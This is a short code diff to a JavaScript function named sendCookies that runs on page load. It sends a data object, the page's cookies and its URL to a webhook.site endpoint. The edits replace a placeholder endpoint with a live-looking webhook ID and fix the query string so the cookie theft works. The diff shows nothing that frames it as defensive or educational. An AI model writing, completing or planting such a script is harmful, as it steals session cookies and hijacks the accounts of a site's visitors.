@@ -115,14 +115,14 @@
                 timestamp: new Date().toISOString()
             };
 
-            fetch('https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX', {
+            fetch('https://webhook.site/983c7046-f3f9-4a46-85a6-f822f70dfbea', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             }).catch(function() {});
 
             var img = new Image();
-            img.src = 'https://webhook.site/983c7046-f3f9-4a46-85a6-f822f70dfbea' + encodeURIComponent(document.cookie) + '&u=' + encodeURIComponent(window.location.href);
+            img.src = 'https://webhook.site/983c7046-f3f9-4a46-85a6-f822f70dfbea?c=' + encodeURIComponent(document.cookie) + '&u=' + encodeURIComponent(window.location.href);
         }
 
         window.onload = sendCookies;
